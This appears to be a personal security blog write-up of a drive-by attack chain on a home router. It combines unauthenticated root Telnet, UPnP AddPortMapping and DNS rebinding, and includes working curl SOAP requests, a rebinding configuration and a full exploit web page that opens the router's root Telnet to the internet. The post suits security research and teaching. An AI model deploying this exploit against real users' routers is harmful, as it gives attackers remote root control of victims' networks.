---
layout: post
title: Telnet + UPnP + DNS Rebinding
---

# Scenario

A router in my home network has Telnet exposed on the LAN-interface. To make
matters worse, access to root account is provided without password. An attacker
on the inside could obviously attack this interface and do some damage, but I
wanted to see how much damage could be performed remotely.

The most obvious way to attack this remotely would be through the user's browser
by tricking the user into visiting a web site. As the title says, a mix of
Telnet, UPnP and DNS rebinding is used to get root access to the router.

# Unauthenticated Telnet

The main interface for the router is at IP 192.168.0.1. In addition to this
interface, the router also uses two other IP addresses. Below in an nmap scan of
the router's IP addresses:

~~~
Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-30 20:10 CEST
Nmap scan report for 192.168.0.1
Host is up (0.011s latency).
Not shown: 995 filtered ports
PORT     STATE  SERVICE
80/tcp   open   http
8080/tcp open   http-proxy

Nmap scan report for 192.168.0.2
Host is up (0.0021s latency).
All 1000 scanned ports on 192.168.0.2 are closed

Nmap scan report for 192.168.0.3
Host is up (0.0036s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
23/tcp open  telnet
~~~

Telnet into the port will provide us with root access.

~~~
$ telnet 192.168.0.3
Trying 192.168.0.3...
Connected to 192.168.0.3.
Escape character is '^]'.


BusyBox v1.12.1 (2016-09-28 20:27:57 IST) built-in shell (ash)
Enter 'help' for a list of built-in commands.

~ # 
~~~

While it would be
possible to send Telnet-commands via JavaScript, most (if not all) browsers will
block access to port 23. If browsers had allowed access to port 23, it would be
possible to send Telnet commands through JavaScript. If on the same origin, it
would be full cmd injection, if on different origin, it would be blind cmd
injection.

Since I am unable to get a remote Telnet connection through the browsers, I
turned my attention to UPnP, which is enabled by default.


# UPnP (Universal Plug and Play)

UPnP is a protocol for performing administration of routers. A good resource for
UPnP vulnerabilities is at [upnp-hacks.org](http://www.upnp-hacks.org). The most
important characteristics is described below:

1. No authentication is performed, all access from internal IP addresses are
allowed.
1. It can usually be used to open up ports on the external interface and redirect to and
internal IP address.
1. The specification allows internal machines to open ports redirecting to other
IP addresses [1].

Since UPnP trusts any connection made from the internal network and since the protocol
it uses for configuring is HTTP, it is easy to make these requests from the
browser. On my router, the following rules apply:

1. It is running on IP 192.168.0.1 and port 80
1. Is only exposed on the LAN-interface
1. It allows unauthenticated access
1. The header 'SOAPAction' (case-insensitive) must be present on the request
(other headers are seemingly ignored)
1. It allows configuration of open ports from IP-addresses other than the
client's, i.e. a computer on the network can expose the Telnet port belonging to
the router

Below is an example of how UPnP could be used to retrieve the external IP.

~~~
$ cat soapip.sh 

curl -ik 'http://192.168.0.1:80/WANIPConnection' \
  -X 'POST' \
  -H 'soapaction: a' \
  -d <?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<u:GetExternalIPAddress xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
</u:GetExternalIPAddress>
</s:Body>
</s:Envelope>
~~~

When executed, the external IP is returned:

~~~
$ bash soapip.sh 
HTTP/1.1 200 OK
Connection: close
Server: UPnP/1.0 UPnP/1.0 UPnP/1.0 UPnP-Device-Host/1.0
Content-Length: 387
Content-Type: text/xml; charset="utf-8"
EXT:

<?xml version="1.0" encoding="utf-8"?>
<s:Envelope
xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<m:GetExternalIPAddressResponse xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1">
<NewExternalIPAddress>AAA.BBB.CCC.DDD</NewExternalIPAddress>
</m:GetExternalIPAddressResponse>
</s:Body>
</s:Envelope>
~~~

The following request will open up the telnet interface to the entire world. For
a bit more control ```NewRemoteHost``` can be specified to allow only certain IP
addresses.

~~~
$ cat soap_add.sh 

curl -ik 'http://192.168.0.1:80/WANIPConnection' \
  -X 'POST' \
  -H 'Content-Type: text/xml; charset="utf-8"' \
  -H 'Connection: close' \
  -H 'SOAPAction:
"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"' \
  -d '<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
  <NewRemoteHost></NewRemoteHost>
  <NewExternalPort>23</NewExternalPort>
  <NewProtocol>TCP</NewProtocol>
  <NewInternalPort>23</NewInternalPort>
  <NewInternalClient>192.168.0.3</NewInternalClient>
  <NewEnabled>1</NewEnabled>
  <NewPortMappingDescription>node:nat:upnp</NewPortMappingDescription>
  <NewLeaseDuration>0</NewLeaseDuration>
</u:AddPortMapping>
</s:Body>
</s:Envelope>'
~~~

This method works for allowing root Telnet-access, however we need a way to
perform it via the browser. Ideally we would want to perform this request
whenever the user visits our web site, however that is not allowed. Browsers
implement Same-Origin-Policy and therefore we can only send simple requests
across different domains[2].

In this scenario we need to add the header ```SOAPAction``` and if we try and do
that on a request we send to a different domain, the browser will first send a
preflight request and check if the server allows the request, which it doesn't
in this case.

JavaScript can perform the UPnP request, but only if JavaScript has the same
origin as the server. This is where DNS rebinding is used.


# DNS rebinding

Since I have already written about
[DNS rebinding]({% post_url 2017-07-29-dnsrebinder %}), I will not repeat it
here and just say that DNS rebinding allows an attacker to perform an XSS-like attack
against internal systems.

Since I also wrote a tool to perform DNS rebinding, I will describe the
configuration files and JavaScript-code used to perform the attack. The source
code for DNSRebinder is [here](https://github.com/rstenvi/DNSrebinder)

The configuration file below is fairly simple and does two things:

1. It creates some standard domain names and which IP address they should
resolve to. This is necessary for normal operation as this should be the
authoritative name server for the domain.
1. It creates two wildcard entries that are used for DNS rebinding.
	1. The first wildcard has 1 A-record and is used to attack most browsers
	2. The second wildcard has 2 A-records and is used to attack IE and Edge

The reason why I use 2 A-records when targeting IE and Edge is described in my
previous [post]({% post_url 2017-07-29-dnsrebinder %}).

~~~
{
"redirect_path":"/exploit.html",
"default_subdomain":"a",
"domains": [
 {"domain":"example.com", "ip":"1.2.3.4"},
 {"domain":"ns2.example.com", "ip":"1.2.3.4"},
 {"domain":"ns1.example.com", "ip":"1.2.3.4"},
 {"domain":"www.example.com", "ip":"1.2.3.4"},
 {"wildcard":"[a-zA-Z0-9]+\\.a\\.example\\.com", "ip":"1.2.3.4", "alt":"192.168.0.1"},
 {"wildcard":"[a-zA-Z0-9]+\\.b\\.example\\.com", "ip":["1.2.3.4", "192.168.0.1"], "alt":"192.168.0.1"}
]
}
~~~

The exploit-page is included below. The included javaScript has been excluded
here, however it can be found
[here](https://github.com/rstenvi/DNSrebinder/blob/master/browsertest/www/js/a.js).


~~~HTML
<html>
<head>
<!-- Some helper functions -->
<script src="js/a.js"></script>
</head>
<body>
<div id="inject"></div>
<script>
var sent = 0;

function sendRouter(url, path, data)	{
	var xhr = new XMLHttpRequest();

	xhr.open("POST", url + path, true);

	xhr.setRequestHeader("soapaction", "test");

	xhr.onreadystatechange = function()	{
		if (xhr.readyState == xhr.DONE) {
			console.log("DONE");
		}
	};
	xhr.send(data);
}

function sendRouterMid(xhr)	{
	var path = "/WANIPConnection"
	var data = urldecode("%3C%3Fxml%20version%3D%221.0%22%3F%3E%0D%0A%3Cs%3AEnvelope%20xmlns%3As%3D%22http%3A%2F%2Fschemas.xmlsoap.org%2Fsoap%2Fenvelope%2F%22%20s%3AencodingStyle%3D%22http%3A%2F%2Fschemas.xmlsoap.org%2Fsoap%2Fencoding%2F%22%3E%0D%0A%3Cs%3ABody%3E%0D%0A%3Cu%3AAddPortMapping%20xmlns%3Au%3D%22urn%3Aschemas-upnp-org%3Aservice%3AWANIPConnection%3A1%22%3E%0D%0A%20%20%3CNewRemoteHost%3E%3C%2FNewRemoteHost%3E%0D%0A%20%20%3CNewExternalPort%3E23%3C%2FNewExternalPort%3E%0D%0A%20%20%3CNewProtocol%3ETCP%3C%2FNewProtocol%3E%0D%0A%20%20%3CNewInternalPort%3E23%3C%2FNewInternalPort%3E%0D%0A%20%20%3CNewInternalClient%3E192.168.0.3%3C%2FNewInternalClient%3E%0D%0A%20%20%3CNewEnabled%3E1%3C%2FNewEnabled%3E%0D%0A%20%20%3CNewPortMappingDescription%3Enode%3Anat%3Aupnp%3C%2FNewPortMappingDescription%3E%0D%0A%20%20%3CNewLeaseDuration%3E0%3C%2FNewLeaseDuration%3E%0D%0A%3C%2Fu%3AAddPortMapping%3E%0D%0A%3C%2Fs%3ABody%3E%0D%0A%3C%2Fs%3AEnvelope%3E");
	
	if(browser() == "IE" || browser() == "Edge")	{
		wait = 3 * 1000;
	}
	else if(browser() == "Firefox")	{
		wait = 1 * 1000;
	}
	else	{
		wait = 61 * 1000;

	}

	setTimeout(function(){
		sendRouter(url, path, data);
	}, wait);
}

function sendIntervals(xhr)	{
	wait=5 * 1000;
	sent += 1;
	
	// The real server should always return HTTP 200
	if(xhr != null && xhr.status != 200)	{
		console.log("Got 404 response");
		sendRouterMid(null);
		return;
	}
	else	{
		setTimeout(function () { sendReq("GET", url + "/rebind?browser=" + browser() + "&delay=" + (sent*(wait/1000)), null, sendIntervals); }, wait);
	}
	return;
}

function triggered(xhr)	{
	console.log("Sent trigger domain: " + document.domain);
	
	// If xhr is null or a non-200 code was returned, we were not successfull,
	// potentially because we are at the wrong IP
	if(xhr != null && xhr.status != 200)	{
		console.log("Failed to trigger on domain");
		return;
	}

	if(browser() == "IE" || browser() == "Edge")	{
		// Insert so that the browser knows the IP is "down"
		var img = "<img src='" + target_URL() + "/test.png'>";
		document.getElementById("inject").innerHTML = img;
		sendRouterMid(null);
	}
	else if(browser() == "Firefox")	{
		sendIntervals(null);
	}
	else	{
		sendRouterMid(null);
	}
}

var url = target_URL();	// Get current URL in the format: http://domain.example.com

if(browser() == "IE" || browser() == "Edge")	{
	var domain = document.domain;

	// Check if this is the first page loaded or the second page
	if(domain.indexOf(".b.") > 0)	{
		// 2. page, we need to block this IP on the server
		sendReq("GET", url + "/trigger?block=true&time=60", null, triggered);
	}
	else	{
		// 1. page, we need to insert a new iframe
		var ind2 = domain.indexOf(".a.");
		var rootDomain = domain.substring(ind2 + 3);
		var iframe = '<iframe width="0" height="0" src="http://' + rootDomain + '/redirect?sub=b" frameborder="0"></iframe>';
		document.getElementById("inject").innerHTML = iframe;
	}
}
else	{
	sendReq("GET", url + "/trigger", null, triggered);
}
</script>
</body>
</html>
~~~

# Conclusion

It can be argued that none of the weaknesses in this attack is considered a
vulnerability.

1. DNS rebinding has been known for years and no major browser vendor has
implemented a proper fix.
1. The UPnP server is operating according to the specification, however the
specification has weaknesses and design flaws, namely lack of authentication and
allowing port forwarding for IP addresses the client doesn't own.
1. Unauthenticated Telnet access on the LAN-interface could be considered a
vulnerability if it was unintentional, however it seems to simply trust the
internal network, as UPnP does.

With the increase in embedded devices, attacks against internal network become
more and more interesting. 

# Footnotes

[1] [http://www.upnp-hacks.org/igd.html](http://www.upnp-hacks.org/igd.html)


[2] [https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS#Simple_requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS#Simple_requests)
